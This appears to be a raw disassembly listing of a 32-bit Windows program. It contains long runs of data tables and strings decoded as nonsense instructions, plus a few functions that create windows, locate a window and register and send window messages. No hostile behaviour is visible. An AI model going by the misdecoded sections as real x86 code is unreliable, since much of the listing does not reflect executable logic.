add [ ebx + 0x825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x25ffc0 ] cl
mov bl 0x47
add [ ebx - 0x3da0040 ] cl
mov dl 0x47
add [ ebx - 0x7da0040 ] cl
mov dl 0x47
add [ ebx - 0xbda0040 ] cl
mov dl 0x47
add [ ebx - 0xfda0040 ] cl
mov dl 0x47
add [ ebx - 0x13da0040 ] cl
mov dl 0x47
add [ ebx - 0x17da0040 ] cl
mov dl 0x47
add [ ebx - 0x1bda0040 ] cl
mov dl 0x47
add [ ebx - 0x1fda0040 ] cl
mov dl 0x47
add [ ebx - 0x23da0040 ] cl
mov dl 0x47
add [ ebx - 0x27da0040 ] cl
mov dl 0x47
add [ ebx - 0x2bda0040 ] cl
mov dl 0x47
add [ ebx - 0x2fda0040 ] cl
mov dl 0x47
add [ ebx - 0x33da0040 ] cl
mov dl 0x47
add [ ebx - 0x37da0040 ] cl
mov dl 0x47
add [ ebx - 0x3bda0040 ] cl
mov dl 0x47
add [ ebx - 0x3fda0040 ] cl
mov dl 0x47
add [ ebx - 0x43da0040 ] cl
mov dl 0x47
add [ ebx - 0x47da0040 ] cl
mov dl 0x47
add [ ebx - 0x4bda0040 ] cl
mov dl 0x47
add [ ebx - 0x4fda0040 ] cl
mov dl 0x47
add [ ebx - 0x53da0040 ] cl
mov dl 0x47
add [ ebx - 0x57da0040 ] cl
mov dl 0x47
add [ ebx - 0x5bda0040 ] cl
mov dl 0x47
add [ ebx - 0x5fda0040 ] cl
mov dl 0x47
add [ ebx - 0x63da0040 ] cl
mov dl 0x47
add [ ebx - 0x67da0040 ] cl
mov dl 0x47
add [ ebx - 0x6bda0040 ] cl
mov dl 0x47
add [ ebx - 0x6fda0040 ] cl
mov dl 0x47
add [ ebx - 0x73da0040 ] cl
mov dl 0x47
add [ ebx - 0x77da0040 ] cl
mov dl 0x47
add [ ebx - 0x7bda0040 ] cl
mov dl 0x47
add [ ebx - 0x7fda0040 ] cl
mov dl 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x7825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x7425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x7025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x6825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x6425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x6025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x5c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x5825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x5425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x5025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x4c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x4825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x4425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x4025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x3c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x3825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x3425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x3025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x2c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x7825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x7425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x7025ffc0 ] cl
mov bl 0x47
add [ ebx - 0x63da0040 ] cl
mov ah 0x47
add [ ebx - 0x67da0040 ] cl
mov ah 0x47
add [ ebx - 0x6bda0040 ] cl
mov ah 0x47
add [ ebx - 0x6fda0040 ] cl
mov ah 0x47
add [ ebx - 0x73da0040 ] cl
mov ah 0x47
add [ ebx - 0x77da0040 ] cl
mov ah 0x47
add [ ebx - 0x7bda0040 ] cl
mov ah 0x47
add [ ebx - 0x7fda0040 ] cl
mov ah 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x7825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x7425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x7025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x6825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x6425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x6025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x5c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x5825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x5425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x5025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x4c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x4825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x4425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x4025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x3c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x3825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x3425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x3025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x2c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x2825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x2425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x2025ffc0 ] cl
mov ah 0x47
add [ ebx + 0x1c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x1825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x1425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x1025ffc0 ] cl
mov ah 0x47
add [ ebx + 0xc25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x825ffc0 ] cl
mov ah 0x47
add [ ebx + 0x425ffc0 ] cl
mov ah 0x47
add [ ebx + 0x25ffc0 ] cl
mov ah 0x47
add [ ebx - 0x3da0040 ] cl
mov bl 0x47
add [ ebx - 0x7da0040 ] cl
mov bl 0x47
add [ ebx - 0xbda0040 ] cl
mov bl 0x47
add [ ebx - 0xfda0040 ] cl
mov bl 0x47
add [ ebx - 0x13da0040 ] cl
mov bl 0x47
add [ ebx - 0x17da0040 ] cl
mov bl 0x47
add [ ebx - 0x1bda0040 ] cl
mov bl 0x47
add [ ebx - 0x1fda0040 ] cl
mov bl 0x47
add [ ebx - 0x23da0040 ] cl
mov bl 0x47
add [ ebx - 0x27da0040 ] cl
mov bl 0x47
add [ ebx - 0x2bda0040 ] cl
mov bl 0x47
add [ ebx - 0x2fda0040 ] cl
mov bl 0x47
add [ ebx - 0x33da0040 ] cl
mov bl 0x47
add [ ebx - 0x37da0040 ] cl
mov bl 0x47
add [ ebx - 0x3bda0040 ] cl
mov bl 0x47
add [ ebx - 0x3fda0040 ] cl
mov bl 0x47
add [ ebx - 0x43da0040 ] cl
mov bl 0x47
add [ ebx - 0x47da0040 ] cl
mov bl 0x47
add [ ebx - 0x4bda0040 ] cl
mov bl 0x47
add [ ebx - 0x4fda0040 ] cl
mov bl 0x47
add [ ebx - 0x53da0040 ] cl
mov bl 0x47
add [ ebx - 0x57da0040 ] cl
mov bl 0x47
add [ ebx - 0x5bda0040 ] cl
mov bl 0x47
add [ ebx - 0x5fda0040 ] cl
mov bl 0x47
add [ ebx - 0x63da0040 ] cl
mov bl 0x47
add [ ebx - 0x67da0040 ] cl
mov bl 0x47
add [ ebx - 0x6bda0040 ] cl
mov bl 0x47
add [ ebx - 0x6fda0040 ] cl
mov bl 0x47
add [ ebx - 0x73da0040 ] cl
mov bl 0x47
add [ ebx - 0x77da0040 ] cl
mov bl 0x47
add [ ebx - 0x7bda0040 ] cl
mov bl 0x47
add [ ebx - 0x7fda0040 ] cl
mov bl 0x47
add [ ebx + 0x2c25ffc0 ] cl
mov bh 0x47
add [ ebx + 0x2825ffc0 ] cl
mov bh 0x47
add [ ebx + 0x1c25ffc0 ] cl
mov bh 0x47
add [ ebx + 0x1025ffc0 ] cl
mov bh 0x47
add [ ebx + 0xc25ffc0 ] cl
mov bh 0x47
add [ ebx + 0x825ffc0 ] cl
mov bh 0x47
add [ ebx + 0x425ffc0 ] cl
mov bh 0x47
add [ ebx + 0x25ffc0 ] cl
mov bh 0x47
add [ ebx + 0x1825ffc0 ] cl
mov bh 0x47
add [ ebx + 0x1425ffc0 ] cl
mov bh 0x47
add [ ebx + 0x2425ffc0 ] cl
mov bh 0x47
add [ ebx + 0x2025ffc0 ] cl
mov bh 0x47
add [ ebx - 0x3da0040 ] cl
mov dh 0x47
add [ ebx - 0x7da0040 ] cl
mov dh 0x47
add [ ebx - 0xbda0040 ] cl
mov dh 0x47
add [ ebx - 0xfda0040 ] cl
mov dh 0x47
add [ ebx - 0x13da0040 ] cl
mov dh 0x47
add [ ebx - 0x17da0040 ] cl
mov dh 0x47
add [ ebx - 0x1bda0040 ] cl
mov dh 0x47
add [ ebx - 0x1fda0040 ] cl
mov dh 0x47
add [ ebx - 0x23da0040 ] cl
mov dh 0x47
add [ ebx - 0x27da0040 ] cl
mov dh 0x47
add [ ebx - 0x2bda0040 ] cl
mov dh 0x47
add [ ebx - 0x2fda0040 ] cl
mov dh 0x47
add [ ebx - 0x33da0040 ] cl
mov dh 0x47
add [ ebx - 0x37da0040 ] cl
mov dh 0x47
add [ ebx - 0x3bda0040 ] cl
mov dh 0x47
add [ ebx - 0x3fda0040 ] cl
mov dh 0x47
add [ ebx - 0x43da0040 ] cl
mov dh 0x47
add [ ebx - 0x47da0040 ] cl
mov dh 0x47
add [ ebx - 0x4bda0040 ] cl
mov dh 0x47
add [ ebx - 0x4fda0040 ] cl
mov dh 0x47
add [ ebx - 0x53da0040 ] cl
mov dh 0x47
add [ ebx - 0x57da0040 ] cl
mov dh 0x47
add [ ebx - 0x5bda0040 ] cl
mov dh 0x47
add [ ebx - 0x5fda0040 ] cl
mov dh 0x47
add [ ebx - 0x63da0040 ] cl
mov dh 0x47
add [ ebx - 0x67da0040 ] cl
mov dh 0x47
add [ ebx - 0x6bda0040 ] cl
mov dh 0x47
add [ ebx - 0x6fda0040 ] cl
mov dh 0x47
add [ ebx - 0x73da0040 ] cl
mov dh 0x47
add [ ebx - 0x77da0040 ] cl
mov dh 0x47
add [ ebx - 0x7bda0040 ] cl
mov dh 0x47
add [ ebx - 0x7fda0040 ] cl
mov dh 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x7825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x7425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x7025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x6825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x6425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x6025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x5c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x5825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x5425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x5025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x4c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x4825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x4425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x4025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x3c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x3825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x3425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x3025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x2c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x2825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x2425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x2025ffc0 ] cl
mov dh 0x47
add [ ebx + 0x1c25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x1825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x1425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x1025ffc0 ] cl
mov dh 0x47
add [ ebx + 0xc25ffc0 ] cl
mov dh 0x47
add [ ebx + 0x825ffc0 ] cl
mov dh 0x47
add [ ebx + 0x425ffc0 ] cl
mov dh 0x47
add [ ebx + 0x25ffc0 ] cl
mov dh 0x47
add [ ebx - 0x3da0040 ] cl
mov ch 0x47
add [ ebx - 0x7da0040 ] cl
mov ch 0x47
add [ ebx - 0xbda0040 ] cl
mov ch 0x47
add [ ebx - 0xfda0040 ] cl
mov ch 0x47
add [ ebx - 0x13da0040 ] cl
mov ch 0x47
add [ ebx - 0x17da0040 ] cl
mov ch 0x47
add [ ebx - 0x1bda0040 ] cl
mov ch 0x47
add [ ebx + 0x1025ffc0 ] cl
mov dh 0x47
add [ ebx - 0x1fda0040 ] cl
mov ch 0x47
add [ ebx - 0x23da0040 ] cl
mov ch 0x47
add [ ebx - 0x27da0040 ] cl
mov ch 0x47
add [ ebx - 0x2bda0040 ] cl
mov ch 0x47
add [ ebx - 0x2fda0040 ] cl
mov ch 0x47
add [ ebx - 0x33da0040 ] cl
mov ch 0x47
add [ ebx - 0x33da0040 ] cl
mov ch 0x47
add [ ebx - 0x37da0040 ] cl
mov ch 0x47
add [ ebx - 0x3bda0040 ] cl
mov ch 0x47
add [ ebx - 0x3fda0040 ] cl
mov ch 0x47
add [ ebx - 0x43da0040 ] cl
mov ch 0x47
add [ ebx - 0x47da0040 ] cl
mov ch 0x47
add [ ebx - 0x4bda0040 ] cl
mov ch 0x47
add [ ebx - 0x4fda0040 ] cl
mov ch 0x47
add [ ebx - 0x53da0040 ] cl
mov ch 0x47
add [ ebx - 0x57da0040 ] cl
mov ch 0x47
add [ ebx - 0x5bda0040 ] cl
mov ch 0x47
add [ ebx - 0x5fda0040 ] cl
mov ch 0x47
add [ ebx - 0x63da0040 ] cl
mov ch 0x47
add [ ebx - 0x67da0040 ] cl
mov ch 0x47
add [ ebx - 0x6bda0040 ] cl
mov ch 0x47
add [ ebx - 0x6fda0040 ] cl
mov ch 0x47
add [ ebx - 0x73da0040 ] cl
mov ch 0x47
add [ ebx - 0x77da0040 ] cl
mov ch 0x47
add [ ebx - 0x7bda0040 ] cl
mov ch 0x47
add [ ebx - 0x7fda0040 ] cl
mov ch 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x7825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x7425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x7025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x6825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x6425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x6025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x5c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x5825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x5425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x5025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x4c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x4825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x4425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x4025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x3c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x3825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x3425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x3025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x2c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x2825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x2425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x2025ffc0 ] cl
mov ch 0x47
add [ ebx + 0x1c25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x1825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x1425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x1025ffc0 ] cl
mov ch 0x47
add [ ebx + 0xc25ffc0 ] cl
mov ch 0x47
add [ ebx + 0x825ffc0 ] cl
mov ch 0x47
add [ ebx + 0x425ffc0 ] cl
mov ch 0x47
add [ ebx + 0x25ffc0 ] cl
mov ch 0x47
add [ ebx - 0x3da0040 ] cl
mov ah 0x47
add [ ebx - 0x7da0040 ] cl
mov ah 0x47
add [ ebx - 0xbda0040 ] cl
mov ah 0x47
add [ ebx - 0xfda0040 ] cl
mov ah 0x47
add [ ebx - 0x13da0040 ] cl
mov ah 0x47
add [ ebx - 0x17da0040 ] cl
mov ah 0x47
add [ ebx - 0x1bda0040 ] cl
mov ah 0x47
add [ ebx - 0x1fda0040 ] cl
mov ah 0x47
add [ ebx - 0x23da0040 ] cl
mov ah 0x47
add [ ebx - 0x27da0040 ] cl
mov ah 0x47
add [ ebx - 0x2bda0040 ] cl
mov ah 0x47
add [ ebx - 0x2fda0040 ] cl
mov ah 0x47
add [ ebx - 0x33da0040 ] cl
mov ah 0x47
add [ ebx - 0x37da0040 ] cl
mov ah 0x47
add [ ebx - 0x3bda0040 ] cl
mov ah 0x47
add [ ebx - 0x3fda0040 ] cl
mov ah 0x47
add [ ebx - 0x43da0040 ] cl
mov ah 0x47
add [ ebx - 0x47da0040 ] cl
mov ah 0x47
add [ ebx - 0x4bda0040 ] cl
mov ah 0x47
add [ ebx - 0x4fda0040 ] cl
mov ah 0x47
add [ ebx - 0x53da0040 ] cl
mov ah 0x47
add [ ebx - 0x57da0040 ] cl
mov ah 0x47
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
inc edi
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x5c25ffc0 ] cl
add [ ebx + 0x6425ffc0 ] cl
mov bl 0x47
add [ ebx + 0x6025ffc0 ] cl
mov bl 0x47
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
mov esp 0x600405e
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x5825ffc0 ] cl
mov bl 0x47
add [ ebx + 0x5425ffc0 ] cl
mov eax eax
add ecx [ eax ]
pop esi
inc eax
add [ ebx + 0x2425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x2025ffc0 ] cl
mov dl 0x47
add [ ebx + 0x1c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x6825ffc0 ] cl
mov bl 0x47
sub_406984
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402930
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402920
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_4069dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402930
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402920
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406a34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406b29
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406b51
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406b58
retn
sub_406b64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406b89
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406b90
retn
sub_406b9c
cmpsb [ fs : esi ] [ edi ]
inc edi
add al dh
inc [ eax ]
add [ esi + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + 0x47 ] ah
add dh bh
inc [ eax ]
add [ esi + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + 0x47 ] ah
add al cl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] dh
inc edi
add [ ebp + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] bh
inc edi
add [ ebp + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] ah
inc edi
add [ ebp + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x74ab0000 ] ch
in al dx
xor eax eax
push ebp
push sub_406ea9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406eb0
retn
sub_406ed0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
outsd
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
js r-xdata
imul ebp [ edi + 0x6e ] r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
